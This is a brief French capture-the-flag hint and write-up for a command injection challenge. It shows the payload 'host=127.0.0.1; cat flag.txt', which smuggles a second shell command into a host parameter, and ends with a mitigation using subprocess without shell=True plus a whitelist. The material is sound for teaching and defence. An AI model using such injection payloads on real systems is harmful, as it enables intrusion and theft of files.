Hint

Tente host=127.0.0.1; cat flag.txt ou host=127.0.0.1 && cat flag.txt selon la shell.

Write-up

Soumettre ?host=127.0.0.1; cat flag.txt provoque l'exécution de cat flag.txt si la commande est interprétée par le shell.

La sortie contiendra la flag.

Mitigation : éviter shell=True, utiliser subprocess.run([...], shell=False) et valider le host (whitelist).